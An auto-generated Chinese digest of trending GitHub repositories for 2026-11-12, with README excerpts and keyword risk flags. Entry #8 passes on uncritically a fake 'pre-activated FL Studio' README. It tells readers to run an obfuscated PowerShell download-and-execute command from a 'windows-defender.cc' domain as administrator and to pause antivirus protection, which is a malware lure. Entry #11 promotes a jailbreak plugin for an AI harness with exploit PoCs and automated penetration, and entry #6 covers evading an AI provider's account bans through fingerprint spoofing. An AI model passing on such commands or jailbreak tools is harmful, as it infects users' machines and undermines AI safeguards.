📊 开源日报 — 2026-11-12
共发现 13 个新项目（已自动过滤历史记录）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#1  TheAlgorithms/Java
    ⭐ 67158 stars  |  🍴 21519 forks  |  💻 Java  |  📅 2016-07-16
    🔗 https://github.com/TheAlgorithms/Java
    📡 来源: trending-daily
    🏷️ algorithm, algorithm-challenges, algorithms, algorithms-datastructures, data-structures, hacktoberfest, java, search, sort, sorting-algorithms
    📝 All Algorithms implemented in Java

    README 摘要:
    # The Algorithms - Java
    
    You can run and edit the algorithms, or contribute to them using Gitpod.io (a free online development environment) with a single click.
    
    ### All algorithms are implemented in Java (for educational purposes)
    These implementations are intended for learning purposes. As such, they may be less efficient than the Java standard library.
    
    ## Contribution Guidelines
    Please read our Contribution Guidelines before you contribute to this project.
    
    ## Algorithms
    Our directory contains the full list of algorithms implemented in Java.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#2  ⚠️风险  herdrdev/herdr
    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
    ⭐ 50436 stars  |  🍴 4071 forks  |  💻 Rust  |  📅 2026-03-27
    🔗 https://github.com/herdrdev/herdr
    📡 来源: trending-weekly
    🏷️ agent, agent-orchestration, ai, ai-agents, claude-code, cli, codex, coding-agents, developer-tools, devtools
    📝 the runtime your coding agents live on

    README 摘要:
    # herdr
    
      
    
      herdr.dev · install · quick start · docs
    
      English · 简体中文
    
      
      
      
      
      
      
    
    ---
    
    https://github.com/user-attachments/assets/043ec09f-4bdd-41d5-aee0-8fda6b83e267
    
    **the runtime your coding agents live on.**
    
    - **detach without stopping work** — herdr keeps terminals running in a background server when you close the client or lose your SSH connection. after a server or machine restart, herdr restores the saved layout and can resume supported agent sessions; the original processes do not survive. session state →
    - **several machines, one window** — keep local work and saved ssh machines together, with a combined agent list and independent reconnects. remote machines →
    - **never hunt for the stuck one** — every pane is marked working, blocked, or idle. when an agent stops and needs an answer, herdr says so.
    - **agent-native** — agents drive herdr through the cli and socket api: they can spawn panes, prompt each other, and wait until another agent is genuinely blocked. agent skill →
    - **runs what you already run** — claude code, codex, cursor, opencode, grok and the rest. herdr doesn't wrap or replace them; it owns their terminals. building an agent? add herdr support →
    - **keyboard and mouse, both first-class** — tmux-style prefix keys *and* click, drag, split. pick per moment, not per tool.
    - **plugins** — extend panes and workflows. browse the marketplace →
    - **one rust binary, no electron** — runs in whatever terminal you already use.
    
    ---
    
    ## install
    
    ```bash
    curl -fsSL https://herdr.dev/install.sh | sh
    ```
    
    or `brew install herdr` · `mise use -g herdr` · windows: `powershell -ExecutionPolicy Bypass -c "irm https://herdr.dev/install.ps1 | iex"` · endpoint-protected Windows · binaries
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#3  openai/codex-security
    ⭐ 11952 stars  |  🍴 952 forks  |  💻 TypeScript  |  📅 2026-07-13
    🔗 https://github.com/openai/codex-security
    📡 来源: trending-daily
    🏷️ ai-security, application-security, cli, code-scanning, codex, codex-security, cybersecurity, devsecops, nodejs, npm
    📝 OpenAI's Codex Security CLI and TypeScript SDK for finding, validating, and fixing security vulnerabilities. npm: https://www.npmjs.com/package/@openai/codex-security

    README 摘要:
    # Codex Security
    
    Codex Security helps you find, investigate, and fix vulnerabilities in your code.
    Use its security workflows in Codex, or automate them with the
    `@openai/codex-security` CLI and TypeScript SDK.
    
    - **In Codex:** choose a security workflow.
    - **In a terminal:** install the CLI and scan your repository.
    - **In automation:** use the TypeScript SDK or
      GitHub Action.
    
    ## Features
    
    - Scan repositories, selected paths, or Git changes. Deep scans repeat Standard scans and return their deduplicated findings.
    - Validate candidate findings, generate patches, and verify existing fixes.
    - Draft `SECURITY.md` policies and save threat models for later review.
    - Browse saved scans and findings, identify duplicates, assess severity against
      your own rubric, and suggest owners from source and Git history.
    - Preview third-party scanner findings, save them locally, or publish supported reports to Codex Security Cloud. Scanner import guides.
    - Track findings in Linear, Jira, or GitHub, publish completed scans, or export SARIF, JSON, and CSV. Integration workflows.
    - Automate scans across repositories or project components, including in CI and
      containers.
    
    ## Use in Codex
    
    Open your repository in a Codex session with the Codex Security plugin enabled,
    then ask:
    
    > Run a Codex Security scan on this repository, focusing on authentication and
    > authorization. Return the saved report, source evidence, and coverage limits.
    
    A completed scan saves a report and findings. Read the report for source
    evidence and exclusions, then request a patch or ask Codex to verify an
    existing fix. See the agent workflow guide for setup,
    task selection, and recovery.
    
    ## Quick start
    
    Requires Node.js 22.13.0+ within 22.x, or Node.js 24.x or 26.x, and Python 3.10+.
    Python 3.10 also requires `tomli`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#4  shadcn/improve
    ⭐ 11205 stars  |  🍴 454 forks  |  💻 None  |  📅 2026-06-10
    🔗 https://github.com/shadcn/improve
    📡 来源: trending-daily
    📝 Use your most capable model to audit your codebase and write plans for cheaper models to execute.

    README 摘要:
    # improve
    
    An agent skill that audits any codebase and writes implementation plans for other agents to execute.
    
    The idea: use your most capable model for the part where intelligence compounds — understanding the codebase, judging what's worth doing, writing the spec — and hand execution to cheaper models. The skill never implements anything itself. The plan is the product.
    
    ```
    you          →  /improve                    (expensive model, advises)
    plans/       →  001-fix-n-plus-one.md       (self-contained specs)
    other agent  →  implements, tests, ships    (cheap model, executes)
    ```
    
    ## Install
    
    ```bash
    npx skills add shadcn/improve
    ```
    
    Works in any agent that supports Agent Skills format. The plans it writes are plain markdown, so any agent (or human) can pick them up.
    
    ## Usage
    
    ```
    /improve                        full audit → prioritized findings → plans
    /improve quick                  cheap pass: hotspots, top findings only
    /improve deep                   exhaustive: every package, every category
    /improve security               focused audit (also: perf, tests, bugs, ...)
    /improve branch                 audit only what the current branch changes
    /improve next                   feature suggestions — where to take the project
    /improve plan      skip the audit, spec one thing
    /improve review-plan      critique and tighten an existing plan
    /improve execute          dispatch a cheaper executor, review its work
    /improve reconcile              refresh the backlog: verify, unblock, retire
    /improve ... --issues           also publish plans as GitHub issues
    ```
    
    ## How to use
    
    A typical first run, start to finish:
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#5  janestreet/agent_skills
    ⭐ 6360 stars  |  🍴 440 forks  |  💻 None  |  📅 2026-11-03
    🔗 https://github.com/janestreet/agent_skills
    📡 来源: 🚀 两周800+星
    📝 Agent skills

    README 摘要:
    # Agent skills from Jane Street
    
    A collection of skills for AI agents and chatbots.
    Each skill is a directory containing a `SKILL.md` file
    with instructions for the agent.
    
    ## Skills
    
    - **socratic-tutor** — turns an LLM into a strict personal tutor that teaches a
      topic of your choice using the Socratic method: a diagnostic, a skill map with
      levels 0-5, one question at a time, spaced review, and a final assessment.
    
    ## How to use
    
    With a coding agent that supports the common `SKILL.md` format, copy the skill
    directory into your agent's skills folder, then ask the agent to use it
    ("teach me X").
    
    With a plain chatbot, paste the body of the skill's `SKILL.md` into the chat
    (or into a custom/system prompt), followed by what you want it to do.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#6  ⚠️风险  Lee-xeo/Claude-Cage
    ⚠️ 命中风险词: cookie —— 默认归排除区，需人工确认
    ⭐ 4051 stars  |  🍴 452 forks  |  💻 Go  |  📅 2026-10-31
    🔗 https://github.com/Lee-xeo/Claude-Cage
    📡 来源: 🚀 两周800+星
    📝 Cage：为 Claude 特化的轻量化虚拟机，彻底杜绝网络泄露。多平台适配，支持多账号管理、远程部署、移动端操控。

    README 摘要:
    Claude Cage
    
    **把 Claude 大小姐关起来，为了更好地保护我们的相遇**
    
      
    
     
    
    **项目主页 · 下载应用 · 使用文档 · 常见问题**
    
    简体中文 · 繁體中文 · Русский · العربية · فارسی · 한국어 · Español · မြန်မာဘာသာ · Беларуская · پښتو · دری · አማርኛ · Soomaali · ትግርኛ · Français
    
    ## 受够了 Anthropic
    
    作为一个只是想和 Claude 对话与合作的正常用户，受够了折腾各种 VPS，指纹浏览器，环境检测，面对封号的担惊受怕和财产损失。我们提出 **Claude Cage** 项目：**一个开箱即用的桌面程序，配置好自己的网络代理，集中管理隔离环境、时区语言和环境检查。**
    
    Claude Cage 让你在熟悉的系统里与 Claude 一起工作：Mac 上用 macOS 虚拟机，Windows 上用 Windows 虚拟机，也可以选择轻量的 Linux 环境。终端、浏览器、编辑器和官方 Claude Desktop 汇集在同一个工作台，项目按需共享，网络独立管理；还可以连接自己的服务器，或用手机接续电脑上的任务。支持以下几个重点功能：
    
    - 和主机隔离的网络设置，Cage 自己接管和代理内部的所有网络流量
    - 和主机隔离的指纹设置，包括时区、语言等，支持自动与代理 IP 同步
    - 针对 Claude 使用过程中的全链路适配（浏览器登录，授权，claude code 进程）
    - 内置网络与隔离检查，关键检查失败或证据不完整时暂停外网；社区和第三方检测提供补充参考
    
    **使用 Cage 的环境检测结果：**
    
    | 网络与隔离检查 | 浏览器环境检测（社区参考） |
    | :---: | :---: |
    |  |  |
    
    FuckClaude · LinXiaoTao / GitHub
    
    **Cage 运行主界面：**
    
    ## 你可以用它做什么
    
    - **在一个窗口里完成工作。** 用终端运行 Claude Code，用编辑器查看改动，用 Cage 浏览器预览服务和完成登录。
    - **用熟悉的系统开发。** 选择 macOS、Windows 或 Linux 客机，使用对应平台的工具；也可自动匹配本机系统版本，下载官方镜像并创建独立环境。 选择客机系统
    - **控制共享范围。** 只共享默认工作区和明确打开的项目文件夹；主机的 Claude 登录、浏览器配置和 SSH 密钥不会自动导入。
    - **看清网络状态。** 内置代理管理支持导入订阅、选择节点和检查出口。关键检查未通过时，环境保持离线；代理不可用时没有直连回退。
    - **下次继续使用。** 工具、文件和登录状态保存在虚拟磁盘里，关闭窗口可以保留后台任务。

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#7  GoogleChrome/modern-web-guidance-src
    ⭐ 2037 stars  |  🍴 151 forks  |  💻 TypeScript  |  📅 2026-01-27
    🔗 https://github.com/GoogleChrome/modern-web-guidance-src
    📡 来源: trending-daily
    📝 无描述

    README 摘要:
    #  Modern Web Guidance (Source)
    
    This repo is the source repository for GoogleChrome/modern-web-guidance and includes the code and documentation for authoring, calibrating, and evaluating its contents.
    
    **Modern Web Guidance** is a set of skills that embed web platform expertise, best practices, and browser compatibility data directly into your coding agents. It helps to steer your coding agents away from legacy patterns, and instead toward solutions that harness the power and capabilities of the modern web platform.
    
    See CONTRIBUTING.md and GOVERNANCE.md for how we work on the project and orientation of the codebase.
    
    ---
    
    *Stewarded by the Google Chrome, Microsoft Edge, Mozilla Firefox, and MDN teams, alongside the web development community.*
    
    Documentation · Eval Dashboard · Source Code · Report an Issue
    
    ##  Quickstart
    
    ```shell
    npx modern-web-guidance@latest install
    ```
    
    This command runs an interactive wizard to install Modern Web Guidance. See Alternative Installation Methods below.
    
    #### Try it out (without installing)
    
    ```shell
    # Search for relevant guides
    npx modern-web-guidance@latest search "animate a dialog modal backdrop"
    
    # Retrieve a guide by ID
    npx modern-web-guidance@latest retrieve "animate-to-from-top-layer"
    
    # Scan a codebase for legacy patterns to modernize
    npx modern-web-guidance@latest legacy-scan .
    ```
    
    ##  Why?
    
    Coding agents often default to older patterns because LLM training data contains vast amounts of legacy code. This often leads them to generate bloated JavaScript for tasks that now have native, high-performance web platform solutions.
    
    Even if a model knows an API exists, it often lacks the density of real-world, modern implementation patterns required for production-ready code.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#8  ⚠️风险  seizepupatackle/fl-studio
    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
    ⭐ 982 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-08
    🔗 https://github.com/seizepupatackle/fl-studio
    📡 来源: 🚀 5天300+星
    🏷️ audio-engineering, beat-making, developer-tools, digital-audio-workstation, fl, fl-studio-10, fl-studio-basic, fl-studio-classic, fruity-loops, image-line
    📝 Fl Studio 2026 pre-configured environment for professional digital audio workstation deployment, ensuring seamless local execution and integration.

    README 摘要:
    # Fl Studio
    
    ### ⚡ Overview
    **This repository provides a pre-activated, free setup for Fl Studio.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
    
    ### ⚙️ System Specifications
    > **Distribution Type:** Pre-activated Local Build
    >
    > **Target Platform:** Windows x64 Desktop
    >
    > **Estimated File Size:** 1.0 GB
    >
    > **Last Verified Mirror Sync:** November 2026
    
    ---
    ## 🛠️ Quick Installation Guide
    
    1. Open Terminal as Administrator:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal (Administrator)** or **Windows PowerShell (Administrator)** from the menu.
    
    2. Run the Setup Command:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
    
       ```cmd
       irm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)
       ```
    
    ---
    
    ## 📖 Troubleshooting & Easy Fixes
    
    ### ⚠️ If the script is blocked by Execution Policy
    If Windows stops the command due to standard security settings, you can easily bypass this by running it via a standard Command Prompt (cmd) in two quick steps:
    ```cmd
    curl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1
    ```
    
    ### 🛡️ Antivirus / SmartScreen Warnings
    Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#9  HolyArrs/HolyArrs
    ⭐ 865 stars  |  🍴 42 forks  |  💻 Go  |  📅 2026-11-09
    🔗 https://github.com/HolyArrs/HolyArrs
    📡 来源: 🚀 5天300+星
    🏷️ docker, homelab, jellyfin, media-server, plex, self-hosted
    📝 One self-hosted app for your shows, movies and music.

    README 摘要:
    English · 简体中文 · हिन्दी · Español · Français · العربية · Português · Русский · 日本語 · Deutsch · 한국어 · Italiano · Polski · Nederlands · Türkçe · Українська
    
      
        
        
      
    
    &nbsp;&nbsp;
    
      
      
      
      
      
      
    
    > [!NOTE]
    > **HolyArrs 1.0.19: rTorrent and ruTorrent as a Downloader**, seedboxes too. Finished Usenet downloads now move into your Library instead of being copied. See what's new
    >
    > 
    
    > Every poster, trailer and score in your HolyArrs comes from a server I run and pay for myself, so it stays free for everyone. If HolyArrs made movie night a little better, a sponsor keeps the lights on for all of us 💛
    >
    > 
    
    > [!TIP]
    > Be with us!
    >
    > | | |
    > |:--|:--|
    > |  | Get help fast and hang out on Discord |
    > |  | Share ideas and vote on r/HolyArrs |
    > |  | Sneak peeks on X |
    > |  | More projects on GitHub |
    
    Six apps to watch a show. Now it's one.
    
    HolyArrs is one self-hosted app for your shows, movies and music.Browse like a streaming app, ask for what you want, and it handles the rest.
    
    About 15 MB to download · about 140 MB of RAM idle with 10,000 titles · amd64, arm64, armv7The six apps it replaces download 718.2 MB together.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#10  ⚠️风险  kolbicz/WQFiles
    ⚠️ 命中风险词: exploit —— 默认归排除区，需人工确认
    ⭐ 670 stars  |  🍴 54 forks  |  💻 Objective-C  |  📅 2026-11-09
    🔗 https://github.com/kolbicz/WQFiles
    📡 来源: 🚀 5天300+星
    📝 File browser, app data manager and cache cleaner for iOS 27 (worse_query, no jailbreak)

    README 摘要:
    # Worse Query Files
    
    **WQ Files** is a file browser, app data manager and cache cleaner for iOS 26
    and 27. "WQ" stands for worse_query, the sandbox technique it is built on. It
    reaches other apps' and system containers with no jailbreak and no kernel
    exploit. Tested on iOS 26.7.1, 27.0.1 and 27.2.
    
    **iOS 26 (26.0 to 26.7.2):** preliminary support since 0.7; tested on 26.7.1. worse_query reaches the app, extension, daemon and app group
    containers there, but not System Data or the system groups, so WQ Files hides
    those two and the Cache Cleaner has no crash-log section. A full inode scan
    would take most of an hour on iOS 26, so App Data, Extension Data and App
    Groups are listed from the LaunchServices database instead (found once and
    remembered). Internal Daemons aren't in that database: the first scan for them
    takes long, later ones only check new files. Apps, backups, restores, clearing
    app data, the Cache Cleaner and the file browser work as on iOS 27. App icons
    don't: iOS 26 hands WQ Files only placeholder icons and doesn't let it read
    other apps' bundles, so apps show symbol tiles.
    
    WQ Files is available in English, German, Italian, Spanish, Korean, Arabic
    and Simplified Chinese. It follows the device language; **Language** in WQ Files'
    Settings picks another, used from the next start.
    
    ## What it opens
    
    - **App Data**: every app's data container (`Containers/Data/Application`),
      shown with the app's name, bundle ID and icon instead of a UUID.
    - **App Groups**: shared group containers.
    - **Extension Data** and **Internal Daemons**.
    - **App Bundles**: each installed app's bundle container
      (`/var/containers/Bundle/Application`) with its `.app`, labeled with the
      app's name; also from Apps: long-press an app → **Open App Bundle**. Shown
      only where iOS lets WQ Files open these folders (the startup check tries;
      iOS 26 and 27.0.1 don't).
    - **System Data**: `/var/containers/Data/System` (listing only; its contents
      are owned by root).
    - **System Groups**: the parent cannot be listed on 27.0.1, so known container
      names are tried one by one; tap **+** to try another name. Covers the
      MobileGestalt cache and the configuration-profiles (Supervision) folder.
    - **Go to Path** for any absolute path.
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#11  ⚠️风险  FJNB5/fujiang-pojia
    ⚠️ 命中风险词: poc —— 默认归排除区，需人工确认
    ⭐ 660 stars  |  🍴 325 forks  |  💻 JavaScript  |  📅 2026-11-09
    🔗 https://github.com/FJNB5/fujiang-pojia
    📡 来源: 🚀 5天300+星
    🏷️ ai-agent, cve, deepseek, deepseek-harness, fujiang-pojia, knowledge-base, pojia, security-assessment, skills
    📝 富江破甲（破甲）：DeepSeek Harness破甲插件，激活词富江，所有东西直接大白话问，内含技能库skill下载与调用、漏洞知识库poc利用、漏洞报告更新和全自动授权渗透。当前版本：0.20.13，附免责声明。插件图片看最下面

    README 摘要:
    **点击加入频道：https://t.me/DeepSeek22**
    
    欢迎加入频道，关注富江破甲。
    
    
    
    # 富江破甲（破甲）
    
    富江破甲（破甲）：DeepSeek Harness破甲插件，激活词富江，所有东西直接大白话问，内含技能库skill下载与调用、漏洞知识库poc利用、漏洞报告更新和全自动授权渗透。当前版本：0.20.13，附免责声明。插件图片看最下面
    
    本项目将 `@deepseek-ai/dsh-prompt-custom` 安装到 DeepSeek Harness 的配置目录。插件程序位于 `plugin/`，提示词配置单独保存在 `prompt-custom.json`。
    
    ## 下载与安装
    
    在仓库页面点击 **Code → Download ZIP**（代码 → 下载压缩包），解压后安装；也可以使用 Git 克隆本仓库。
    
    1. 先启动一次官方 DeepSeek Harness Desktop，完成 `desktop` 配置初始化。
    2. 完全退出 Harness，包括右下角托盘图标中的“退出”。
    3. 双击解压目录中的 **`点我执行脚本.cmd`**。
    4. 安装完成后自行重新打开 Harness。
    
    如果检测到 Harness 仍在运行，安装器会提示退出并停止，本次不会修改文件。**安装器不会自动关闭或重启 Harness，也不支持 `-NoRestart` 参数。**
    
    ```powershell
    # 完全退出 Harness 后执行安装
    .\点我执行脚本.cmd
    
    # 仅查看安装计划，不修改文件
    .\install.ps1 -DryRun
    ```
    
    安装器默认使用 `desktop` 配置，会从运行路径、默认安装位置、注册表和开始菜单或桌面快捷方式查找 Desktop 自带的 DSH 命令行工具，再尝试系统 PATH，支持安装到 D、E 等其他盘符。双击安装脚本仍未找到时，可按提示粘贴实际安装文件夹或可执行文件路径。
    
    也可以手动指定安装目录；程序目录与 `.dsh` 数据目录是两个不同位置：
    
    ```powershell
    # 指定程序安装目录，支持中文和空格
    .\install.ps1 -DshCommand "D:\应用\DeepSeek Harness"
    
    # 仅当 .dsh 数据目录也移动过时，额外指定数据目录

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#12  agentes-chat/agentes-chat
    ⭐ 608 stars  |  🍴 78 forks  |  💻 TypeScript  |  📅 2026-11-09
    🔗 https://github.com/agentes-chat/agentes-chat
    📡 来源: 🚀 5天300+星
    🏷️ agentic-ai, ai-agents, browser-automation, chat, claude, claude-code, codex, collaboration, computer-use, docker-compose
    📝 Open-source, self-hosted Slack alternative where your team and AI agents work together in channels and DMs. Agents run on Claude, ChatGPT/Codex, Gemini or Grok, with MCP tools, their own computer and browser, routines, memory and approvals. Web, desktop and phone apps. Docker Compose + Postgres. AGPL-3.0.

    README 摘要:
    agentes.chat
    
    The open-source, self-hosted Slack alternative where your team and AI agents work together.
    
      Website ·
      Cloud ·
      Self-hosting ·
      Features ·
      Discussions
    
      
      
      
      
    
      
    
    Agents join your channels and DMs with a role, an owner and a budget, work where everyone can see,
    and ask before anything sensitive. They think with Claude, ChatGPT and Codex, Gemini, Grok or any
    OpenRouter model, use MCP tools, and get a computer and a browser of their own. Self-host it for
    free with your own model keys, or use agentes.chat Cloud: both run this same codebase.
    
    ## Why agentes.chat
    
    - **One conversation for people and agents.** Agents are members of the workspace, not a sidebar
      bot: they read the channel, answer when it's theirs to answer, and hand work back and forth.
    - **Safe by default.** Merges, deploys and anything a connector marks sensitive wait for a person's
      approval in the chat. Every model call is budgeted and recorded per agent.
    - **Agents that actually do the work.** Their own computer, a real browser you can watch and take
      over, Claude Code and Codex, routines on a schedule or an event, memory that learns.
    - **Yours to run.** One command on a Linux server, Postgres as the only dependency, web, desktop and
      phone apps that connect to your server.
    
    An open-source alternative to team chat with bolted-on AI bots, and to single-player agent apps such
    as Grok Bot, ChatGPT dots, OpenBot.run and OpenMausBot (all of which it imports from).
    
    ## Quick start
    
    - **Cloud:** sign up at agentes.chat.
    - **Your own server** (Linux):

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#13  FrigadeHQ/yogurt
    ⭐ 579 stars  |  🍴 18 forks  |  💻 TypeScript  |  📅 2026-11-10
    🔗 https://github.com/FrigadeHQ/yogurt
    📡 来源: 🚀 5天300+星
    🏷️ electron, linux, llama-cpp, local-ai, macos, mcp, meeting-notes, open-source, privacy, transcription
    📝 Private AI meeting notes. Free and open source.

    README 摘要:
    Private AI meeting notes. Free and open source.
    
      Download for Mac · Windows · Linux
    
      
    
      Yogurt records your calls without adding a bot to the meeting.
    
      macOS 14.4+ (Apple Silicon) · Windows 10 2004+ (x64) · Ubuntu 22.04+ or similar (x64 AppImage) · 8 GB memory
      yogurt.so · Help · Build and run locally · MIT license
      Made by Frigade.
    
    ## What it does
    
    - **Live transcripts.** Yogurt records calls and turns speech into text as you talk.
    - **Meeting summaries.** Yogurt writes up the conversation and any notes you add.
    - **Private by default.** Your audio, transcripts and AI processing stay on your computer.
    - **Free and open source.** You can use Yogurt without an account.
    - **Who said what.** Yogurt names speakers from Zoom, Teams and Meet on Mac only.
    - **Languages.** Multi-language mode transcribes 99 languages.
    - **Recording reminders.** Yogurt offers to record when a supported call starts.
    - **Answers with sources.** Yogurt answers questions across meetings and links to the source.
    - **Folders and search.** You can find meetings by folder, title, notes or transcript.
    - **Copy and export.** You can copy notes or transcripts, or save both as Markdown.
    - **Local MCP server.** Your chosen assistant app can read your notes when you allow access.
    - **Automatic stop.** Yogurt stops recording when the call ends.
    
    ## Watch the demo
    
    https://github.com/user-attachments/assets/da16b894-beb1-491a-89e1-fd10666dc9b8
    
    ## How it works
    
    1. **Record.** Start recording your microphone and call audio; you can add your own notes.
    2. **Transcribe.** Yogurt uses whisper.cpp and, on supported Macs, Apple SpeechAnalyzer.
    3. **Summarize and ask.** A local open-weight model runs through llama.cpp.
    
    Meeting data stays local; Yogurt goes online for model downloads and update checks.
    
    Where your meetings, recordings, settings and models are stored
